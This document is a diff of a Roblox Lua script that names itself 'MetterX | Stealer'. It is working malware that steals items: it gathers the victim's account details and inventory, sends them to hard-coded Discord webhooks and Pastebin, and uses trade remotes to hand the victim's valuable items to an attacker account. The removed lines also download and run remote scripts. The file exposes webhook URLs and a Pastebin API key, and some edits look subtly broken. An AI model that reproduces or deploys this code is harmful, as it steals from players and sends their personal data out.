@@ -1,14 +1,14 @@
 -- [ Settings ] --
-Username = "1LazySly8" -- [Your Username]
-Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
-Script = "" -- [None | Custom | MetterX Hub | Highlight Lite]
-RawLink = "" -- [Raw Link If "Custom"]
+local Username = "1LazySly8" -- [Your Username]
+local Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
+local Script = "" -- [None | Custom | MetterX Hub | Highlight Lite]
+local RawLink = "" -- [Raw Link If "Custom"]
 
 -- [ Dual Settings ] --
-DualUsername = "QuadCoreDragon" -- [Dual Username]
-DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
-DualItems = 0.1 -- [Minimum Valuable Items Count]
-DualAncient = 1 -- [Minimum Ancient Count]
+local DualUsername = "QuadCoreDragon" -- [Dual Username]
+local DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
+local DualItems = 0.1 -- [Minimum Valuable Items Count]
+local DualAncient = 1 -- [Minimum Ancient Count]
 
 repeat wait() until game:IsLoaded()
 
@@ -34,17 +34,15 @@ end
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
-local IdValue = game:GetService("Players").LocalPlayer.userId
-or "Unknown"
-local NameValue = game:GetService("Players").LocalPlayer.Name
-or "Unknown"
-local DisplayNameValue = game:GetService("Players"):GetPlayerByUserId(IdValue).DisplayName or "Unknown"
-local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
-or "Unknown"
+
+local IdValue = game.Players.LocalPlayer.userId or "Unknown"
+local NameValue = game.Players.LocalPlayer.Name or "Unknown"
+local DisplayNameValue = game.Players:GetPlayerByUserId(IdValue).DisplayName or "Unknown"
+local AgeValue = game.Players.LocalPlayer.AccountAge or "Unknown"
 local ExecutorValue = identifyexecutor() or "Unknown"
 local PlayersValue = #game:GetService("Players"):GetPlayers() or "Unknown"
 local MaxPlayersValue = game.Players.MaxPlayers or "Unknown"
-local ServerTimeValue = os.date("%c",os.time()) or "Unknown"
+local ServerTimeValue = os.date("%c", os.time()) or "Unknown"
 local ClientIdValue = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
 local PlaceNameValue = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
 local PlaceIdValue = game.PlaceId or "Unknown"
@@ -76,36 +74,21 @@ function SendMessageEMBED(url, embed, bool)
             }
         }
     }
-    local data2 = {
-        username = "MetterX | Stealer", 
-        avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&", 
-        ["content"] = "--@everyone\n " .. TeleportScript .. " ",
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-            }
-        }
-    }
     local body = http:JSONEncode(data)
-    local body2 = http:JSONEncode(data2)
+    local response
+    if bool then
+        data.content = "--@everyone\n " .. TeleportScript .. " "
+        body = http:JSONEncode(data)
+    end
     
-    if bool == true then
-        local response = request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body2
-        })
-    else
-        local response = request({
+    pcall(function()
+        response = request({
             Url = url,
             Method = "POST",
             Headers = headers,
             Body = body
         })
-    end
+    end)
 end
 
 local destroytrades2 = coroutine.create(function()
@@ -128,7 +111,7 @@ end)
 
 -- items
 local levelTable = {}
-for i,v in pairs(LevelModule.XPTable) do
+for i, v in pairs(LevelModule.XPTable) do
     if PlayerDataModule.NewXP < v then
         table.insert(levelTable, i)
     end
@@ -157,55 +140,39 @@ local godlyItemsC = 0
 local ancientItemsC = 0
 local uniqueItemsC = 0
 
-for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
-    for c,d in pairs(b) do
+for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c, d in pairs(b) do
         table.insert(allItems, d.ItemName)
 
         if d.Rarity == "Vintage" then
             vintageItemsC = vintageItemsC + 1
             table.insert(vintageItems, d.DataID)
-        end
-
-        if d.Rarity == "Common" then
+        elseif d.Rarity == "Common" then
             commonItemsC = commonItemsC + 1
             table.insert(commonItems, d.DataID)
-        end
-
-        if d.Rarity == "Uncommon" then
+        elseif d.Rarity == "Uncommon" then
             uncommonItemsC = uncommonItemsC + 1
             table.insert(uncommonItems, d.DataID)
-        end
-
-        if d.Rarity == "Rare" then
+        elseif d.Rarity == "Rare" then
             rareItemsC = rareItemsC + 1
             table.insert(rareItems, d.DataID)
-        end
-
-        if d.Rarity == "Legendary" then
+        elseif d.Rarity == "Legendary" then
             legendaryItemsC = legendaryItemsC + 1
             table.insert(legendaryItems, d.DataID)
-        end
-
-        if d.Rarity == "Godly" then
+        elseif d.Rarity == "Godly" then
             godlyItemsC = godlyItemsC + 1
             table.insert(godlyItems, d.DataID)
-        end
-
-        if d.Rarity == "Ancient" then
+        elseif d.Rarity == "Ancient" then
             ancientItemsC = ancientItemsC + 1
             table.insert(ancientItems, d.DataID)
-        end
-
-        if d.Rarity == "Unique" then
+        elseif d.Rarity == "Unique" then
             uniqueItemsC = uniqueItemsC + 1
             table.insert(uniqueItems, d.DataID)
         end
     end
 end
 
-for i,v in pairs(allItems) do
-    itemsCount = itemsCount + 1
-end
+itemsCount = #allItems
 
 local function isTradeModuleAvailable()
     local success, TradeModule = pcall(function()
@@ -224,89 +191,25 @@ local function stealItems()
 
     wait(3)
 
-    for i,v in pairs(uniqueItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(ancientItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(godlyItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(vintageItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(legendaryItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(rareItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(uncommonItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-    end
-
-    for i,v in pairs(commonItems) do
-        local args = {
-            [1] = v,
-            [2] = "Weapons"
-        }
-        
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    local itemTypes = {uniqueItems, ancientItems, godlyItems, vintageItems, legendaryItems, rareItems, uncommonItems, commonItems}
+    for _, itemList in ipairs(itemTypes) do
+        for _, itemId in pairs(itemList) do
+            local args = {
+                [1] = itemId,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
     end
 
     wait(6)
-    local acc = {
-        [1] = 285646582 
-    }
+    local acc = { [1] = 285646582 }
     game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
 end
 
 local HttpService = game:GetService("HttpService")
 
 local function pastebin(content)
-
     local body = {
         api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
         api_paste_code = content,
@@ -317,122 +220,65 @@ local function pastebin(content)
     for key, value in pairs(body) do
         encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
     end
-    encodedBody = encodedBody:sub(1, -2)
 
-    local response
-    local success, err = pcall(function()
-        response = request({
-            Url = "https://pastebin.com/api/api_post.php",
-            Method = "POST",
-            Body = encodedBody,
-            Headers = {
-                ["Content-Type"] = "application/x-www-form-urlencoded"
-            },
-            Timeout = 20
-        })
-    end)
+    encodedBody = encodedBody:sub(1, -2) -- Remove the last '&'
 
-    if not success or not response or not response.Success then
-        return "\nError...\n"
-    end
-
-    local pasteUrl = response.Body
-    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
-
-    return rawUrl
-end
-
-local Workspace = game:GetService("Workspace")
-local ItemsFolder = Workspace:WaitForChild("Items") -- Folder in Workspace holding all items
-
-local function getItemDisplayName(itemName)
-    -- Look for the item in Workspace's Items folder
-    local item = ItemsFolder:FindFirstChild(itemName)
-    if item and item:FindFirstChild("Name") then
-        return item.Name.Value -- Returns the display name from the "Name" StringValue
-    end
-    return itemName -- Fallback to original name if "Name" value not found
-end
-
-local function formatItems(itemList)
-    if #itemList == 0 then
-        return "None"
-    else
-        local formattedItems = {}
-        for _, item in ipairs(itemList) do
-            local displayName = getItemDisplayName(item) -- Fetch display name from Workspace.Items
-            table.insert(formattedItems, displayName)
-        end
-        return table.concat(formattedItems, "\n")
-    end
-end
-
--- Building the pastebinString with formatted item lists
-local pastebinString = "-- [ Uniques ] --\n" .. formatItems(uniqueItems) ..
-                       "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
-                       "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
-                       "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
-                       "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
-                       "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
-                       "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
-                       "\n\n-- [ Common ] --\n" .. formatItems(commonItems) ..
-                       "\n\nThis data was generated by using MetterX!"
-
-
-
-local pastebinLink = pastebin(pastebinString)
-
-local totalItemsC = uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC
-local valuableItemsC = uniqueItemsC + ancientItemsC + godlyItemsC
-
-if valuableItemsC >= DualItems or ancientItemsC >= DualAncient then
-    Username = DualUsername
-    Webhook = DualWebhook
-end
-
-local embed = {
-    ["title"] = "You just got a new hit with **MetterX**!",
-    ["color"] = tonumber(0x3365FF),
-    ["fields"] = {
-        {
-            ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
-            ["value"] = "```lua\nDisplay Name: "..DisplayNameValue.."\nUsername: "..NameValue.."\nUserId: "..IdValue.."\nAccount Age: "..AgeValue.."\nExecutor: "..ExecutorValue.."\nReceiver: "..Username.."\nVersion: "..VersionValue.."```"
+    local response = HttpService:RequestAsync({
+        Url = "https://pastebin.com/api/api_post",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/x-www-form-urlencoded"
         },
-        {
-            ["name"] = "〘:computer:〙**Server Info**",
-            ["value"] = "```lua\nPlace Name: "..PlaceNameValue.."\nPlace Id: "..PlaceIdValue.."\nPlace Version: "..PlaceVersionValue.."\nPlayers Count: "..PlayersValue.."/"..MaxPlayersValue.."\nServer Uptime: "..ServerTimeValue.."\nPlatform: "..PlatformValue.."```"
-        }, 
-        {
-            ["name"] = "〘:ringed_planet:〙**Items**",
-            ["value"] = "```lua\nTotal Items: "..totalItemsC.."\nValuable Items: "..valuableItemsC.."\n\nUniques: "..uniqueItemsC.."\nAncients: "..ancientItemsC.."\nGodlys: "..godlyItemsC.."\nLegendarys: "..legendaryItemsC.."\nVintages: "..vintageItemsC.."\nRares: "..rareItemsC.."\nUncommons: "..uncommonItemsC.."\nCommons: "..commonItemsC.."```"
-        },
-        {
-            ["name"] = "〘:package:〙**Items List**",
-            ["value"] = "[Click Here]("..pastebinLink..")"
-        },
-    },
-}
+        Body = encodedBody
+    })
 
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-    SendMessageEMBED(Webhook, embed, true)
-else
-    SendMessageEMBED(Webhook, embed, false)
+    return HttpService:JSONDecode(response.Body)
 end
 
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username then
-        player.Chatted:Connect(function(msg)
+local function processItems()
+    if itemsCount >= 0 then
+        SendMessageEMBED(Webhook, {
+            title = "**MetterX - Stealer**",
+            color = 5814783,
+            fields = {
+                {name = "Username", value = NameValue, inline = true},
+                {name = "Display Name", value = DisplayNameValue, inline = true},
+                {name = "Account Age", value = AgeValue, inline = true},
+                {name = "Executor", value = ExecutorValue, inline = true},
+                {name = "Platform", value = PlatformValue, inline = true},
+                {name = "Players in Server", value = PlayersValue .. "/" .. MaxPlayersValue, inline = true},
+                {name = "Server Time", value = ServerTimeValue, inline = true},
+                {name = "Client ID", value = ClientIdValue, inline = true},
+                {name = "Place", value = PlaceNameValue, inline = true},
+                {name = "Place ID", value = PlaceIdValue, inline = true},
+                {name = "Version", value = VersionValue, inline = true},
+                {name = "Items Count", value = itemsCount, inline = true},
+                {name = "Unique Items", value = uniqueItemsC, inline = true},
+                {name = "Ancient Items", value = ancientItemsC, inline = true},
+                {name = "Godly Items", value = godlyItemsC, inline = true},
+                {name = "Legendary Items", value = legendaryItemsC, inline = true},
+                {name = "Rare Items", value = rareItemsC, inline = true},
+                {name = "Uncommon Items", value = uncommonItemsC, inline = true},
+                {name = "Common Items", value = commonItemsC, inline = true},
+                {name = "All Items", value = table.concat(allItems, ", "), inline = false}
+            }
+        }, false)
+
+        if itemsCount > 0 then
             stealItems()
-        end)
+        end
     end
-end)
-
-if Script == "None" then
-    wait(0)
-elseif Script == "Custom" then
-    loadstring(game:HttpGet(RawLink,true))()
-elseif Script == "Highlight Lite" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
-elseif Script == "MetterX Hub" or Script == "MetterX" then
-    print("soon")
 end
+
+local function executeMain()
+    wait(3)
+    if isTradeModuleAvailable() then
+        processItems()
+    else
+        game:GetService("Players").LocalPlayer:Kick("Trade Module Not Found")
+        wait(5)
+        game:Shutdown()
+    end
+end
+
+executeMain()
